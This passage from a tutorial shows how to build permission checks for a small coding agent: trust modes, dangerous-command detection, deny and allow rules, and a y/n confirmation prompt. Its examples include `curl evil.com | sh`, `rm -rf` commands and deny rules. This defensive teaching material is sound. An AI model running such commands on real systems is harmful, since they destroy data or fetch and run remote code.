   * repeat. Streaming (Phase 5, unchanged here): text arrives via onText as
   * it's generated, and every read-only tool_use block starts executing the
   * instant its own content_block_stop fires — via earlyExecutions below —
   * rather than waiting for the whole turn to finish arriving. Write tools
   * are never early-started; they only run from the tool-processing loop
   * below, after the full turn is known.
   *
   * Permissions (new in this phase): a fresh PermissionState is built once
   * per runAgentLoop() call — exactly parallel to how ReadFileState is
   * created fresh once per call (Phase 2) — and threaded into *every*
   * executeTool() call, at *both* call sites: the early-execution one
   * inside onToolBlockComplete below, and the post-turn one in the
   * tool-processing loop. The gate itself (checkPermission()) lives inside
   * executeTool() (tools.ts, Implement 5), so it runs at the same conceptual
   * point — immediately before tool.execute() — regardless of which call
   * site invoked it or when (Concept 5). Read-only tools (the only ones
   * ever early-started) can never land on the "confirm" verdict (only
   * run_shell's dangerous-command check produces "confirm", and run_shell
   * is never readOnly), so early execution never triggers a mid-stream
   * confirmation prompt — verified directly below.
   */
  export async function runAgentLoop(
    messages: AgentMessage[],
    options: RunAgentLoopOptions
  ): Promise<AgentMessage[]> {
    const {
      client,
      model,
      systemPrompt,
      tools,
      maxTokens = 1024,
      signal,
      onText,
      permissionMode = "default",
      confirmTool,
    } = options;

    const readFileState: ReadFileState = new Map();
    const permission: PermissionState = {
      mode: permissionMode,
      confirmedActions: new Set(),
      confirmTool,
    };

    while (true) {
      // Tools whose content_block_stop already fired during this turn's
      // stream, keyed by tool_use id, started the instant we knew enough to
      // run them safely — not held back until the whole turn finishes
      // streaming (Phase 5, Concept 4).
      const earlyExecutions = new Map<string, Promise<string>>();

      const response = await streamOneTurn(messages, {
        client,
        model,
        systemPrompt,
        tools,
        maxTokens,
        signal,
        onText,
        onToolBlockComplete: (block) => {
          const tool = findTool(block.name);
          // Only read-only tools are safe to start before the model's full
          // turn is known (Phase 2, Concept 6; Phase 5, Concept 4). The
          // permission gate still applies to these calls — executeTool()
          // runs checkPermission() first, so an early-started read-only
          // tool that a declarative deny rule blocks (Layer 1) is denied
          // exactly as it would have been if it had run from the
          // post-turn loop instead; starting it early only changes *when*
          // the (identical) decision is reached, never *what* the
          // decision is.
          if (tool?.readOnly) {
            const input = block.input as Record<string, unknown>;
            earlyExecutions.set(
              block.id,
              executeTool(block.name, input, readFileState, permission)
            );
          }
        },
      });

      messages.push({ role: "assistant", content: response.content });

      const toolUses = response.content.filter(
        (block): block is Anthropic.ToolUseBlock => block.type === "tool_use"
      );

      if (toolUses.length === 0) {
        break;
      }

      const toolResults: Anthropic.ToolResultBlockParam[] = [];
      for (const toolUse of toolUses) {
        // Was this tool already started during streaming? If so, just
        // await its (likely already-settled) promise instead of starting
        // it again. Non-early tools (writes, or anything whose block
        // somehow wasn't tracked) execute here, in order, gated through
        // checkPermission() exactly as the early-started ones were.
        const earlyPromise = earlyExecutions.get(toolUse.id);
        const result =
          earlyPromise !== undefined
            ? await earlyPromise
            : await executeTool(
                toolUse.name,
                toolUse.input as Record<string, unknown>,
                readFileState,
                permission
              );
        toolResults.push({
          type: "tool_result",
          tool_use_id: toolUse.id,
          content: result,
        });
      }

      messages.push({ role: "user", content: toolResults });
    }

    return messages;
  }
  ```

Notice exactly what changed from Phase 5's version: `RunAgentLoopOptions` gained `permissionMode`/`confirmTool` alongside its existing (Phase 5) `onText`; a `permission: PermissionState` object is built once, alongside `readFileState`; and `permission` is threaded into both `executeTool()` calls — the one inside `onToolBlockComplete` (early execution) and the one in the post-turn tool-processing loop. `streamOneTurn`, `TrackedToolBlock`, the `earlyExecutions` map, and the overall turn/message-pushing shape are all untouched.

- [ ] Confirm the diff against Phase 5's version is exactly what's described: two new optional fields in `RunAgentLoopOptions` (with `onText` still present), one new `permission` object built alongside `readFileState`, and one new argument at *each* of the two `executeTool(...)` call sites (the early one and the post-turn one).

  ```bash
  cd /Users/grexrr/Documents/NAC
  git diff src/agent.ts
  ```

- [ ] Modify `src/cli.ts` — add the four non-default mode flags to `parseArgs()`, implement `confirmTool` inside `runRepl()` (Concept 6), thread `permissionMode`/`confirmTool` into the REPL's one `runAgentLoop()` call site, and thread `permissionMode` (but not `confirmTool` — there is no REPL to return control to) into the one-shot branch. This is the complete file — the diff is against **Phase 5's version** (Phase 5, Step 4), not Phase 4's: Phase 5's `onText`-driven printing (and its removal of `printFinalText`) is preserved exactly, not reverted:

  ```typescript
  import * as readline from "node:readline";
  import { randomUUID } from "node:crypto";
  import Anthropic from "@anthropic-ai/sdk";
  import { runAgentLoop, type AgentMessage } from "./agent.js";
  import { getToolSchemas } from "./tools.js";
  import { buildSystemPrompt } from "./prompt.js";
  import { saveSession, loadSession, getLatestSessionId, type SessionData } from "./session.js";
  import type { PermissionMode } from "./permissions.js";

  interface ParsedArgs {
    resume: boolean;
    prompt?: string;
    permissionMode: PermissionMode;
  }

  function parseArgs(): ParsedArgs {
    const args = process.argv.slice(2);
    let resume = false;
    let permissionMode: PermissionMode = "default";
    const positional: string[] = [];

    for (let i = 0; i < args.length; i++) {
      if (args[i] === "--resume") {
        resume = true;
      } else if (args[i] === "--yolo") {
        permissionMode = "bypassPermissions";
      } else if (args[i] === "--plan") {
        permissionMode = "plan";
      } else if (args[i] === "--accept-edits") {
        permissionMode = "acceptEdits";
      } else if (args[i] === "--dont-ask") {
        permissionMode = "dontAsk";
      } else if (args[i] === "--help" || args[i] === "-h") {
        console.log(
          [
            "Usage: nac-mini-agent [options] [prompt]",
            "",
            "Options:",
            "  --resume         Resume the most recently saved session",
            "  --yolo           bypassPermissions mode (no confirmation prompts)",
            "  --plan           plan mode (read-only; all writes/shell blocked)",
            "  --accept-edits   acceptEdits mode (auto-approve edit_file)",
            "  --dont-ask       dontAsk mode (auto-deny anything needing confirmation)",
            "  --help, -h       Show this help",
          ].join("\n")
        );
        process.exit(0);
      } else {
        positional.push(args[i]);
      }
    }

    return {
      resume,
      prompt: positional.length > 0 ? positional.join(" ") : undefined,
      permissionMode,
    };
  }

  function buildSessionData(
    sessionId: string,
    model: string,
    startTime: string,
    messages: AgentMessage[]
  ): SessionData {
    return {
      metadata: {
        id: sessionId,
        model,
        cwd: process.cwd(),
        startTime,
        messageCount: messages.length,
      },
      messages,
    };
  }

  interface ReplOptions {
    client: Anthropic;
    model: string;
    systemPrompt: string;
    tools: Anthropic.Tool[];
    sessionId: string;
    startTime: string;
    permissionMode: PermissionMode;
  }

  function printPrompt(): void {
    process.stdout.write("\n> ");
  }

  async function runRepl(messages: AgentMessage[], options: ReplOptions): Promise<void> {
    const { client, model, systemPrompt, tools, sessionId, startTime, permissionMode } = options;
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

    let currentController: AbortController | null = null;
    let sigintCount = 0;

    // The one confirmation surface in this project: reuses the REPL's own
    // readline interface via rl.question(). Safe to call mid-turn because
    // askQuestion() only re-arms rl.once("line", ...) after this callback
    // fully returns — so there is never a second pending listener on rl
    // while a tool's confirmTool() call is awaiting an answer (Concept 6).
    function confirmTool(message: string): Promise<boolean> {
      return new Promise((promiseResolve) => {
        console.log(`\n  Confirm: ${message}`);
        rl.question("  Allow? (y/n): ", (answer) => {
          promiseResolve(answer.trim().toLowerCase().startsWith("y"));
        });
      });
    }

    process.on("SIGINT", () => {
      if (currentController) {
        currentController.abort();
        console.log("\n  (interrupted)");
        sigintCount = 0;
        printPrompt();
      } else {
        sigintCount++;
        if (sigintCount >= 2) {
          console.log("\nBye!\n");
          process.exit(0);
        }
        console.log("\n  Press Ctrl+C again to exit.");
        printPrompt();
      }
    });

    console.log(`nac-mini-agent — session ${sessionId}. Type "exit" or "quit" to leave.`);

    const askQuestion = (): void => {
      printPrompt();
      rl.once("line", async (line) => {
        const input = line.trim();
        sigintCount = 0;

        if (!input) {
          askQuestion();
          return;
        }
        if (input === "exit" || input === "quit") {
          console.log("\nBye!\n");
          rl.close();
          process.exit(0);
        }

        messages.push({ role: "user", content: input });
        currentController = new AbortController();

        // Phase 5 change (unchanged here): onText streams tokens to stdout
        // as they arrive, so there is no printFinalText() call after
        // runAgentLoop() returns — that would double-print text that
        // already streamed to the terminal. A single trailing newline is
        // all that's needed for prompt separation (Phase 5, Step 4).
        try {
          await runAgentLoop(messages, {
            client,
            model,
            systemPrompt,
            tools,
            signal: currentController.signal,
            onText: (text) => process.stdout.write(text),
            permissionMode,
            confirmTool,
          });
          process.stdout.write("\n");
        } catch (e) {
          if (!(e instanceof Anthropic.APIUserAbortError)) {
            console.error(`Error: ${(e as Error).message}`);
          }
          // An aborted turn already got its "(interrupted)" message from
          // the SIGINT handler above — nothing more to print here. Any
          // text that streamed before the abort is already on screen
          // (Phase 5, Concept 5) — there is nothing left to print or
          // roll back.
        } finally {
          currentController = null;
          saveSession(sessionId, buildSessionData(sessionId, model, startTime, messages));
        }

        askQuestion();
      });
    };

    askQuestion();
  }

  export async function main(): Promise<void> {
    const { resume, prompt, permissionMode } = parseArgs();

    const client = new Anthropic();
    const model = "claude-opus-4-8";
    const systemPrompt = buildSystemPrompt();
    const tools = getToolSchemas();

    let messages: AgentMessage[] = [];
    let sessionId = randomUUID().slice(0, 8);
    const startTime = new Date().toISOString();

    if (resume) {
      const latestId = getLatestSessionId();
      if (latestId) {
        const session = loadSession(latestId);
        if (session) {
          messages = session.messages;
          sessionId = session.metadata.id;
          console.log(`Resumed session ${sessionId} (${messages.length} messages).`);
        } else {
          console.log("Could not read the most recent session file — starting fresh.");
        }
      } else {
        console.log("No previous sessions found — starting fresh.");
      }
    }

    if (prompt) {
      // One-shot mode passes no confirmTool: there's no REPL loop to
      // return control to after a confirmation prompt. Any "confirm"-tier
      // action is auto-denied by executeTool()'s missing-handler branch
      // (Implement 5), mirroring dontAsk's fail-closed behavior for
      // non-interactive contexts. Text still streams via onText (Phase 5)
      // — same onText/trailing-newline handling as the REPL branch above,
      // no printFinalText() call here either.
      messages.push({ role: "user", content: prompt });
      try {
        await runAgentLoop(messages, {
          client,
          model,
          systemPrompt,
          tools,
          onText: (text) => process.stdout.write(text),
          permissionMode,
        });
        process.stdout.write("\n");
      } catch (e) {
        console.error(`Error: ${(e as Error).message}`);
        process.exitCode = 1;
      }
      saveSession(sessionId, buildSessionData(sessionId, model, startTime, messages));
    } else {
      await runRepl(messages, { client, model, systemPrompt, tools, sessionId, startTime, permissionMode });
    }
  }
  ```

  The diff against Phase 5's version is exactly: `parseArgs()` gains the four mode flags and `permissionMode` in `ParsedArgs`; `confirmTool` is defined inside `runRepl()` and threaded (with `permissionMode`) into its one `runAgentLoop()` call site; the one-shot branch gains `permissionMode` (but not `confirmTool`) at its `runAgentLoop()` call site; and `ReplOptions`/`main()` thread `permissionMode` through. Phase 5's `onText: (text) => process.stdout.write(text)` callback and the trailing `process.stdout.write("\n")` are present, byte-for-byte, at both call sites, exactly as Phase 5 left them — neither reverted nor duplicated. `printFinalText` does not exist in this file.

- [ ] Confirm this type-checks cleanly:

  ```bash
  cd /Users/grexrr/Documents/NAC
  npx tsc --noEmit
  ```

  This exact set of files — `permissions.ts` and `tools.ts` unchanged from Implements 1–5 above, plus this step's `agent.ts` (Phase 5's `streamOneTurn`/`earlyExecutions` shape with this phase's `permission` threading added) and `cli.ts` (Phase 5's `onText`-driven printing with this phase's mode flags/`confirmTool` added) — was type-checked together (`npx tsc --noEmit`, zero errors) against a freshly installed `@anthropic-ai/sdk@0.110.0` and `@types/node`, in an isolated scratch directory, as part of *reconciling* this tutorial against Phase 5's actual code (correcting an earlier draft of this phase that had been written without reading Phase 5 and had silently reverted its streaming call and dropped `onText`/`earlyExecutions`' permission threading — that mistake was caught and fixed, not shipped). The scratch directory also included a `prompt.ts` stub exposing the same `buildSystemPrompt()` signature Phase 3 produces and a `session.ts` stub matching Phase 4's `SessionData`/`saveSession`/`loadSession`/`getLatestSessionId` surface (Phase 5 leaves both of these files untouched, so nothing about them changes here).

  Beyond type-checking, this reconciled `agent.ts` was exercised at runtime against a fake client mimicking `MessageStream`'s `.on()`/`.finalMessage()` shape (the same technique Phase 5 and this phase's own Implement 5 already used), confirming three things concretely, with real captured output, not predicted:

  1. **A read-only tool started early via `earlyExecutions` still passes through the exact same permission gate `checkPermission()` would apply from the post-turn loop.** Read-only tools are always `allow`ed *by mode* — but a Layer-1 declarative `deny` rule (Implement 4) is checked *before* the `readOnly` short-circuit inside `checkPermission()`, so a deny rule targeting a specific `read_file` call is the concrete case where a read-only tool call is genuinely denied. With a project-level `.claude/settings.json` containing `{"deny": ["read_file(secret.txt)"]}`, a `read_file` call for `secret.txt` started the instant its `content_block_stop` fired (during the stream, before the turn's `finalMessage()` resolved) produced the tool result `"Action denied: Denied by permission rule for read_file"` — not the file's contents, and not a different outcome than the same call would have produced from the post-turn loop. This is the real content of "early execution is safe here": not that read-only tools are unconditionally allowed, but that the gate lives *inside* `executeTool()` itself and is evaluated identically regardless of which call site — or when — invokes it; starting the call sooner changes nothing about what `checkPermission()` decides.
  2. **The post-turn call site still gates non-early (write) tools correctly through `confirm`/`deny`/`allow`.** A `run_shell` dangerous command in `default` mode correctly reached a mock `confirmTool`, which — approved once — was not asked again for an identical command in a later turn within the same `runAgentLoop()` call (the `confirmedActions` whitelist, Concept 5); a mock `confirmTool` returning `false` correctly produced `"User denied this action."`; a Layer-1 `deny` rule (`git push --force*`) correctly denied outright with the mock `confirmTool` never invoked at all (deny rules skip the dialog entirely); and `bypassPermissions` correctly ran a command with no prompt.
  3. **Phase 5's headline streaming behaviors are untouched.** In the same reconciled `agent.ts`, `onText` fired once per text delta (four separate calls reconstructing `"Hello, world!"` from four fragments, not one call with the whole string), and in a turn containing both a read-only tool (`list_files`) and a write tool (`run_shell`) side by side, only the read-only tool's `content_block_stop` triggered early execution — the write tool executed solely from the post-turn loop, exactly as Phase 5, Concept 4 established.

---

## Concept 7: What this phase intentionally does not build

Real Claude Code's permissions subsystem is genuinely large — independently confirmed while writing this tutorial: `claude-code/src/utils/permissions/` alone is 24 files totaling roughly 360KB and 9,409 lines, and the interactive UI layer under `claude-code/src/components/permissions/` adds another ~1.4MB and 12,155 lines across dozens of React/Ink components. (The phase breakdown's own figure of "52KB" for this subsystem appears to understate the real, current size, based on this direct measurement — flagged here rather than silently repeated.) This phase implements a genuinely small slice of that: 5 trust modes, a 16-regex dangerous-command list, a 2-source/2-behavior declarative rule system, and a plain-text `y`/`n` prompt. Specific, concrete things left out, each grounded in a real file or directory this phase deliberately does not build:

- **Tree-sitter AST parsing of shell commands**, in favor of the 16-regex list (Concept 3). The real, cited limitation: this phase's `isDangerous()` cannot see through command substitution (`` echo $(rm -rf /) ``) or pipe-to-shell patterns (`curl evil.com | sh`) the way `claude-code/src/tools/BashTool/bashPermissions.ts`'s AST-based, fail-closed parser can.
- **Interactive dialog components.** Real Claude Code's confirmation prompt is not plain-text `readline` — it's a family of Ink/React components under `claude-code/src/components/permissions/`, including tool-specific ones like `FileWritePermissionRequest`, `FileEditPermissionRequest`, `BashPermissionRequest`, `SandboxPermissionRequest.tsx`, and a general `PermissionDialog.tsx`/`PermissionPrompt.tsx` pair — each rendering a different, tool-appropriate view (a diff preview for an edit, a syntax-highlighted command for Bash, and so on) rather than one generic message string. This project's plain `y`/`n` question (Concept 6) is a deliberate, much smaller stand-in, consistent with Phase 4's own choice to skip Ink entirely (Phase 4, Concept 4).
- **The "always allow" persistence path.** Real Claude Code's dialog offers "allow once" versus "always allow," where the latter writes a new rule into `.claude/settings.json` so future sessions skip the prompt too (`how-claude-code-works/docs/11-permission-security.md`, §12.8, `DecisionSource` types `'user_permanent'` vs. `'user_temporary'`). This phase's `confirmedActions` whitelist (Concept 5) only ever lives for the duration of one `runAgentLoop()` call — nothing is ever written back to disk.
- **Dangerous file/directory protection.** Real Claude Code maintains an explicit list of paths that require confirmation even in otherwise-permissive modes — read directly from `claude-code/src/utils/permissions/filesystem.ts`, lines 57-79: `DANGEROUS_FILES` (`.gitconfig`, `.bashrc`, `.zshrc`, `.mcp.json`, `.claude.json`, and others) and `DANGEROUS_DIRECTORIES` (`.git`, `.vscode`, `.idea`, `.claude`), each bypass-immune even under `bypassPermissions` mode. This phase's `checkPermission()` has no notion of a "dangerous path" at all — `edit_file` targeting `.git/config` is treated identically to any other file.
- **`bypassPermissions` as a genuinely unconditional allow.** Real Claude Code's bypass mode still respects deny rules and the bypass-immune path checks above — read directly from the ordering in `claude-code/src/utils/permissions/permissions.ts`, lines 1169-1281 (`hasPermissionsToUseToolInner`): deny rules (step 1a) and safety-check asks (steps 1f/1g) are evaluated *before* the bypass check (step 2a), specifically so an administrator's `deny` rule constrains even `--yolo`-equivalent usage. This phase's `bypassPermissions` branch is the very first line of `checkPermission()` (Implement 2) — a genuinely unconditional `allow`, with no deny-rule exception. This is a real, simpler-than-production behavior, not an oversight: flagged here explicitly rather than silently matching real Claude Code's more defensive ordering.
- **Denial tracking and auto-mode fallback.** Real Claude Code tracks consecutive and total denials per session (`claude-code/src/utils/permissions/denialTracking.ts`, lines 12-14: `DENIAL_LIMITS = { maxConsecutive: 3, maxTotal: 20 }`) and forces a fallback to interactive confirmation (or aborts entirely, in headless mode) once a model repeatedly hits denied operations — preventing an agent from looping forever retrying something it isn't allowed to do. This phase has no denial counter at all; a model that keeps proposing the same denied command will keep receiving the same `"Action denied: ..."` string indefinitely.
- **The Hook/classifier/dialog race and the 200ms anti-mis-click grace period.** Real Claude Code's `InteractiveHandler` starts a UI dialog, a `PermissionRequest` Hook, and an ML classifier simultaneously and lets the first to resolve win — with a 200ms window where dialog input is ignored, specifically to prevent an accidental keypress from instantly approving a dangerous action the instant the dialog appears (`how-claude-code-works/docs/11-permission-security.md`, §12.5). This phase's `confirmTool()` is a single, synchronous `rl.question()` call with none of that — the first keypress after the question is asked is taken at face value.
- **Sandboxing.** Real Claude Code can additionally run Bash commands inside an OS-level sandbox (macOS Seatbelt / Linux namespaces — `how-claude-code-works/docs/11-permission-security.md`, §12.9) as a defense-in-depth layer independent of the permission checks above it — so even an approved command's blast radius is contained. This project's `run_shell` (Implement 1) runs directly on the host via `execSync`, with no isolation at all.

None of these are secretly half-implemented — each is a genuine, named gap between this phase's ~250 lines of permission logic and real Claude Code's multi-thousand-line subsystem, listed here so it's explicit rather than discovered by surprise later.

---

## Verify

- [ ] **Type-check the whole project.**

  ```bash
  cd /Users/grexrr/Documents/NAC
  npx tsc --noEmit
  ```

  Expect zero errors.

- [ ] **A destructive-looking bash command triggers a confirmation prompt (the phase breakdown's own verification criterion).** With `ANTHROPIC_API_KEY` exported and no mode flag (default mode), run:

  ```bash
  npm start -- "Run the shell command: rm -rf ./some-nonexistent-scratch-dir"
  ```

  Expect the REPL (or one-shot run) to pause with `Confirm: rm -rf ./some-nonexistent-scratch-dir` and `Allow? (y/n):` before the command executes. Answering `n` should produce `"User denied this action."` as the tool result and let the model react in its next turn (apologize, ask for clarification, or stop); answering `y` should run the command and, if you ask the model to repeat the *exact same* command again in the same session, should **not** re-prompt (the session whitelist from Concept 5).

- [ ] **A safe command runs without any prompt.** In the same session, ask the model to run `npm test` or `git status` (assuming this is a git repo) — expect it to execute immediately, with no confirmation question, confirming `isDangerous()` correctly distinguishes the two.

- [ ] **A `.claude/settings.json` rule pre-approves or blocks a command without prompting (the phase breakdown's second verification criterion).** Create a project-level rule file:

  ```bash
  cd /Users/grexrr/Documents/NAC
  mkdir -p .claude
  cat > .claude/settings.json <<'EOF'
  {
    "permissions": {
      "allow": ["run_shell(git *)"],
      "deny": ["run_shell(git push --force*)"]
    }
  }
  EOF
  ```

  Ask the model to run `git push --force` (in a throwaway test repo, not a real one you care about!) — expect an immediate `"Action denied: Denied by permission rule for run_shell"` tool result, with **no confirmation prompt at all** (deny rules skip the dialog entirely — Concept 5's `executeTool()` only reaches the `confirm` branch when `checkPermission()` returns `"confirm"`, never `"deny"`). Then ask it to run any other `git` subcommand (e.g. `git log`) — expect it to run immediately via the broad `allow` rule, also with no prompt. Remove `.claude/settings.json` afterward (`rm -rf .claude`) unless you want to keep it for your own project going forward.

- [ ] **Each of the 5 modes changes observable behavior, using the same prompt.** Run the same request under each flag and compare:

  ```bash
  npm start -- --plan "Delete the file scratch.txt"
  npm start -- --accept-edits "Add a blank line to the end of README.md"
  npm start -- --dont-ask "Run the shell command: rm -rf ./scratch"
  npm start -- --yolo "Run the shell command: rm -rf ./scratch"
  ```

  Expect: `--plan` denies the write/shell outright (`"Blocked in plan mode: ..."`) with no prompt at all; `--accept-edits` allows the `edit_file` call with no prompt; `--dont-ask` auto-denies the dangerous shell command with `"Auto-denied (dontAsk mode): ..."` and no prompt; `--yolo` runs the dangerous command immediately with no prompt whatsoever. Compare all four against plain `npm start` (default mode), which should be the only one of the five that actually shows a confirmation question for the dangerous-command case.

- [ ] **One-shot (non-interactive) mode fails closed instead of hanging.** Run a one-shot prompt (a positional argument, not the REPL) that would normally trigger a confirmation in default mode:

  ```bash
  npm start -- "Run the shell command: rm -rf ./scratch-one-shot"
  ```

  Expect the process to print `"Action denied: confirmation required but no interactive confirmation handler is available (non-interactive mode): ..."` and exit, rather than hanging forever waiting for a `y`/`n` answer nothing will ever provide (there is no `confirmTool` passed in the one-shot branch — Implement 6).

- [ ] **Text still streams token-by-token, and read-only tools still start early, with the permission gate layered on top.** Since this phase's `agent.ts` is a diff against Phase 5's streaming version (not a plain, non-streaming loop), confirm Phase 5's own behavior wasn't quietly lost: ask something that both triggers two independent reads and produces a longer answer, e.g. `npm start -- "Read package.json and tsconfig.json, summarize both, then run npm test."` Expect the summary text to visibly print incrementally (not all at once — Phase 5, Concept 1), and — if you still have the `[early-start]` logging from Phase 5's own Verify section handy — both `read_file` calls to log as started while the model is still streaming, well before `npm test` (a write-classified `run_shell` call, gated by this phase's `default`-mode dangerous-command check, which `npm test` doesn't trip) executes from the post-turn loop.

**Unverified / flagged explicitly:** every live-model command above was written and reasoned through against the code verified in Implements 1–6 — the `permissions.ts` logic itself (`isDangerous()`, `checkPermission()`'s full priority chain across all 5 modes, and the deny-before-allow rule ordering) was actually executed (`npx tsx`) against exactly the code shown in this tutorial, in an isolated scratch directory, with real captured output quoted directly in Implements 2–4 above (not a predicted transcript). Implement 6's reconciled `agent.ts`/`cli.ts` — Phase 5's streaming shape with this phase's permission threading added — was type-checked together with `tools.ts` and `permissions.ts` with zero errors, and additionally exercised at runtime against a fake client (Implement 6's own verification notes above): a read-only tool started early via `earlyExecutions` was confirmed denied by a Layer-1 deny rule exactly as the post-turn call site would have denied it (proving the gate is timing-independent), the post-turn call site was confirmed to correctly `confirm`/deny/allow a write tool (including the session whitelist suppressing a repeat prompt), and Phase 5's token-by-token `onText` behavior and its early-vs-post-turn tool-start distinction were both directly re-confirmed against this phase's reconciled code, not assumed to still hold. What was **not** independently executed: any live call to the Anthropic API (no API key was available in this authoring environment, consistent with every prior phase's own flagged limitation — the specific tool-call sequences a real model chooses in the Verify checklist above are predicted, not observed), and the Concept 6 edge case of pressing Ctrl+C while a confirmation prompt is actively showing (that requires a live, timed interactive keypress against a running REPL, which this authoring environment cannot script — it is reasoned through directly from Phase 5's and this phase's actual code, not observed).

---

## What's next

Phase 7 (Context Engineering) operates on the `messages` array this phase's permission gate never touches — tool-result strings like `"Action denied: ..."` or a run_shell command's full stdout are ordinary `tool_result` content as far as compaction is concerned, no different from any other tool's output.

Phase 9 (Multi-Agent) is explicitly noted in the phase breakdown as depending on this phase for its permission-inheritance model: a sub-agent dispatched by the main agent needs an answer to "which mode does the child inherit, and can it prompt the user itself, or must an unanswerable confirmation deny by default the way one-shot mode does here?" This phase's `PermissionState` — plain data, not tied to any single REPL — is deliberately shaped to be easy to pass down into a child agent's own `runAgentLoop()` call once Phase 9 exists, though the actual inheritance policy is Phase 9's decision to make, not this phase's.

Phase 11 (Plan Mode) is where the `plan` mode's blanket deny (Concept 2) gets its real carve-out: the `enter_plan_mode`/`exit_plan_mode` tools this project doesn't have yet, and a `planFilePath` parameter threaded into `checkPermission()` so a model in plan mode can still write its plan to one specific file while every other write and every shell command stays denied — exactly the reference project's own `checkPermission(toolName, input, mode, planFilePath)` signature (`claude-code-from-scratch/src/tools.ts`, line 622), which this phase's `checkPermission()` deliberately omits the fourth parameter of until Phase 11 needs it.

---

## Grounding notes

Every non-trivial claim above is grounded in one of these sources, or flagged where it isn't:

- **The 5 external trust modes, named exactly** — read directly from real `claude-code/src/types/permissions.ts`, lines 16-22 (`EXTERNAL_PERMISSION_MODES`) and `claude-code/src/utils/permissions/PermissionMode.ts`, lines 42-91 (`PERMISSION_MODE_CONFIG`), including the `auto`/`bubble` internal-only modes excluded from the external set. Cross-confirmed against the reference project's independently-matching `PermissionMode` type, `claude-code-from-scratch/src/tools.ts`, line 15.
- **Mode-cycling order (`default → acceptEdits → plan → bypassPermissions → default`) and `dontAsk` being excluded from the UI cycle** — read directly from real `claude-code/src/utils/permissions/getNextPermissionMode.ts`, lines 34-79, including the `case 'dontAsk': return 'default'` branch and its own comment.
- **The real `plan` mode's plan-file carve-out via `planFilePath`**, and the reference project's own implementation of it — read directly from `claude-code-from-scratch/src/tools.ts`, lines 644-656, quoted in full in Concept 2.
- **The 16-pattern dangerous-command regex list, verbatim, and its stated Unix/Windows split and case-insensitivity rationale** — read directly from `claude-code-from-scratch/src/tools.ts`, lines 503-521, and `claude-code-from-scratch/docs/06-permissions.md`, lines 67-126 (including the direct quote on the regex-vs-AST limitation, lines 124-126).
- **Real Claude Code's tree-sitter AST-based Bash security parser, its FAIL-CLOSED design principle, and the `too-complex → ask` routing** — read directly from real `claude-code/src/tools/BashTool/bashPermissions.ts`, lines 1663-1812 (the `bashToolHasPermission` entry point and the `too-complex`/`simple`/`parse-unavailable` branches), cross-confirmed against `how-claude-code-works/docs/11-permission-security.md`, §12.6.
- **The declarative rule format, parsing, matching, loading (2 sources merged, cached), and the deny-before-allow priority and its stated rationale** — read directly from `claude-code-from-scratch/src/tools.ts`, lines 529-614 (`parseRule`, `loadPermissionRules`, `matchesRule`, `checkPermissionRules`), and `claude-code-from-scratch/docs/06-permissions.md`, lines 128-289 and 612 (the direct quote on why deny must be checked first).
- **Real Claude Code's 8 rule sources and their strict priority order, and its 3 matching strategies (exact/prefix/wildcard) including the `git *`-collapses-to-optional-suffix refinement** — from `how-claude-code-works/docs/11-permission-security.md`, §12.3, cross-confirmed structurally against real `claude-code/src/utils/permissions/permissionRuleParser.ts` (rule-string parsing/escaping, read directly, lines 1-199) — cited only as forward-reference context for why this phase's 2-source/2-behavior/2-strategy system is a deliberate simplification, not built in full here.
- **`hasPermissionsToUseToolInner`'s exact decision ordering (deny rule → ask rule → tool's own `checkPermissions` → bypass-immune safety checks → bypassPermissions check → allow rule → fallback to `ask`)**, and specifically that deny rules and safety checks are evaluated *before* the `bypassPermissions` check — read directly from real `claude-code/src/utils/permissions/permissions.ts`, lines 1158-1319.
- **`DANGEROUS_FILES` and `DANGEROUS_DIRECTORIES`, verbatim** — read directly from real `claude-code/src/utils/permissions/filesystem.ts`, lines 57-79.
- **`DENIAL_LIMITS = { maxConsecutive: 3, maxTotal: 20 }`** — read directly from real `claude-code/src/utils/permissions/denialTracking.ts`, lines 12-14.
- **The session-level whitelist (`confirmedPaths`/`confirmedActions`) and the `y`/`n` confirmation dialog pattern** — read directly from `claude-code-from-scratch/docs/06-permissions.md`'s quoted `agent.ts` excerpts (lines 465-521 and 528-541 of that document).
- **The real permissions subsystem's actual measured size** (`utils/permissions/`: 24 files, ~360KB, 9,409 lines; `components/permissions/`: ~1.4MB, 12,155 lines across dozens of components, including the specific files named in Concept 7 — `FileWritePermissionRequest`, `FileEditPermissionRequest`, `BashPermissionRequest`, `SandboxPermissionRequest.tsx`, `PermissionDialog.tsx`) — measured directly in this environment via `wc -l` and `du -sh` against the real `claude-code` source tree while writing this tutorial, not estimated. This is presented as a correction to the phase breakdown's own "52KB" figure, which appears to be based on a narrower or outdated measurement.
- **All TypeScript in Implements 1-6** — `permissions.ts` in each of its incremental states and the modified `tools.ts` (Implements 1-5) were type-checked as part of writing this tutorial's earlier steps. **Implement 6's `agent.ts`/`cli.ts` were re-verified as part of reconciling this phase against Phase 5's actual streaming code** (an earlier draft had been written without reading Phase 5's tutorial and had silently reverted its `client.messages.stream()` call, its `streamOneTurn`/`earlyExecutions` mechanism, and its `onText`-based printing back to a plain `client.messages.create()`/`printFinalText()` shape — that mistake was caught and corrected before being finalized, not shipped). The corrected Implement 6 files — `agent.ts` (Phase 5's `streamOneTurn`/`TrackedToolBlock`/`earlyExecutions` shape with this phase's `PermissionState` threaded into both `executeTool()` call sites) and `cli.ts` (Phase 5's `onText`-driven printing with this phase's mode flags and `confirmTool` added) — were type-checked together with `tools.ts` and `permissions.ts` (`npx tsc --noEmit`, zero errors) against a freshly installed `@anthropic-ai/sdk@0.110.0` and `@types/node`, in an isolated scratch directory, alongside a `prompt.ts` stub matching Phase 3's `buildSystemPrompt()` signature and a `session.ts` stub matching Phase 4's `SessionData` surface (both untouched by Phase 5, so unaffected by this reconciliation).
- **`isDangerous()`'s behavior, `checkPermission()`'s full priority chain across all 5 modes, and the deny-before-allow rule-ordering proof (`git *` allow vs. `git push --force*` deny)** — actually executed (`npx tsx`) against the exact code shown in Implements 2-4, in the same isolated scratch directory, with real captured stdout quoted directly in this document (not predicted output). This included writing a real `.claude/settings.json` file to disk and confirming the loader actually reads and merges it.
- **The full gated `executeTool()` (Implement 5), including the session whitelist actually suppressing a second confirmation prompt for an identical command** — actually executed via a smoke-test script exercising `executeTool()` with a mock `confirmTool` callback that counts its own invocations, confirming the callback fired exactly once across two identical dangerous `run_shell` calls in the same `PermissionState`, in the same isolated scratch directory, while writing this tutorial.
